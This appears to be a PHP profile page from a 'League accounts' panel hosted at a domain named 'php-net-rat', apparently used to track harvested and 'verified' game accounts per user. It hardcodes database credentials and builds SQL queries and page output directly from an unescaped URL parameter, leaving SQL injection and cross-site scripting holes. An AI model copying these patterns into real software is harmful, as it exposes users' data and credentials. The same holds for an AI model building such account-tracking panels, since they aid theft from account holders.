<!DOCTYPE html>
<html lang="en" class="demo-3">
	<head>
		<meta charset="UTF-8" />
		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> 
		<meta name="viewport" content="width=device-width, initial-scale=1.0"> 
		<title><?php echo $_GET['profile'].'\'s Profile'; ?></title>
		<link rel="stylesheet" type="text/css" href="css/style.css" />
		<link href='http://fonts.googleapis.com/css?family=Hammersmith+One|Questrial' rel='stylesheet' type='text/css'>
		<script src="js/modernizr.custom.63321.js"></script>
		<link rel="stylesheet" href="css/style_menu.css">
		<link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
		<link rel="stylesheet" href="css/style_profile.css">
	</head>
	<body>
		<div class="container">
			<header>
				<h1><strong>League</strong> accounts</h1>
				<h2>v 1.0.0.0</h2><br>
				<section class="container">
					<nav>
					  <ul class="nav">
						<li><a href="http://php-net-rat.esy.es/users.php" title="Accounts">Accounts</a></li>
						<li><a href="http://php-net-rat.esy.es/profile/dumplist.php" title="Search">Dump</a></li>
						<li><a href="stats.php" title="Statistics">Statistics</a></li>
					  </ul>
					</nav>	
				</section>
			</header>
			<center>
			
				<div class="profile-box">
					<figure class="profile-header">
					<figcaption class="profile-name">
						<?php
							echo $_GET['profile'];
						?>
					</figcaption>
					</figure>
					<p class="profile-detail">
						<span class="profile-label">Status:</span><span class="profile-value">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query('SELECT * FROM u474826184_rp.lc_users WHERE `name`=\''.$_GET['profile'].'\';')  or die(mysql_error());
							while($res=mysql_fetch_array($status))
							{
								if ($res['online']==1)
									echo '<font color="Green">Online</font>';
								else
									echo '<font color="Red">Offline</font>';
							}
						?>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">Accounts:</span><span class="profile-value">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query('SELECT * FROM u474826184_rp.accounts WHERE `lc_users_name`=\''.$_GET['profile'].'\';')  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">Unverified:</span><span class="profile-value">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query("SELECT * FROM u474826184_rp.accounts WHERE `lc_users_name`='".$_GET['profile']."' AND (`verified`='Not validated' OR `verified`='Token Generated');")  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">Verified:</span><span class="profile-value">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query("SELECT * FROM u474826184_rp.accounts WHERE `lc_users_name`='".$_GET['profile']."' AND `verified`='Validated';")  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">Progress:</span><span class="profile-value">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query('SELECT * FROM u474826184_rp.lc_users WHERE `name`=\''.$_GET['profile'].'\';')  or die(mysql_error());
							while($res=mysql_fetch_array($status))
							{
								echo $res['current_percentage'].'%';
							}
						?>
						</span>
					</p>
					
				</div>
					
				
			
			</center>
		</div>
		 
	</body>
</html>